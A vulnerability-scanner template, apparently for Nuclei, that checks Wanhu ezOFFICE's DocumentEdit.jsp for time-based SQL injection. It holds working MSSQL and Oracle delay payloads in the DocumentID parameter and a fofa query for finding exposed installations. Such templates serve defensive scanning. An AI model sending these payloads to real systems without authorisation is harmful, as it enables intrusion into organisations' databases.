id: wanhu-ezoffice-isignaturehtml-documentedit-sqli

info:
  name: 万户 ezoffice documentedit.jsp - sqli
  author: leadlife
  severity: high
  metadata: 
    fofa-query: app="万户网络-ezOFFICE"
    verified: true
    max-request: 2
  tags: wanhu,ezoffice,sqli,oa,time

http:
  - raw:
      - |
        @timeout: 15s
        GET /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp;?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: mssql
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
          - contains(body,'iSignatureHTML')
        condition: and

  - raw:
      - |
        @timeout: 15s
        GET /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp;?DocumentID=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)-- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: oracle
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
          - contains(body,'iSignatureHTML')
        condition: and
